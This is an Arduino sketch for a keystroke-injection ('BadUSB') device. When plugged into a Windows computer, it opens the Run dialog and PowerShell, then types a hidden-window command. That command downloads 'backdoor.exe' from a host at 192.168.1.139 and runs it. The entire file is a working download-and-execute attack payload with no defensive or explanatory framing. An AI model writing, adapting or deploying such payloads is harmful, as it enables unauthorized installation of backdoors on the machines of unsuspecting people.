#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("powershell");
  delay(500);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  Keyboard.end();

  Keyboard.print("cd ~/");
  delay(500);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  Keyboard.end();

  Keyboard.print("powershell -windowstyle hidden c~/; (new-object System.Net.WebClient).DownloadFile('http://192.168.1.139/backdoor.exe','backdoor.exe'); Start-Process \"backdoor.exe\" ");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();

}

// Unused
void loop() {}
